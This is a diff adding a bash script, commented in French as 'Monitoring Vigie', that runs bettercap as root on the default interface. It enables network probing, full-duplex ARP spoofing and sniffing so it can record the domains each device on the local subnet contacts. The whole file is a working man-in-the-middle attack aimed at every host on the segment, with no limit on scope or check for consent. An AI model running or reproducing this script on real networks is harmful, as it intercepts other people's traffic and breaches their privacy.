@@ -1,0 +1,9 @@
+#!/usr/bin/env bash
+# Monitoring Vigie : MITM + sniff du sous-réseau local via bettercap.
+# Révèle les domaines contactés par chaque appareil. Lancé en root (sudo).
+# Remplace bash par bettercap pour que l'arrêt (kill du groupe) soit propre.
+iface=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'dev \K\S+' | head -n1)
+[ -z "$iface" ] && iface=$(ip route 2>/dev/null | grep -oP 'default .*dev \K\S+' | head -n1)
+[ -z "$iface" ] && exit 1
+exec bettercap -iface "$iface" -no-colors -eval \
+  "set arp.spoof.fullduplex true; set net.sniff.verbose false; events.ignore endpoint.new; events.ignore endpoint.lost; net.probe on; arp.spoof on; net.sniff on"
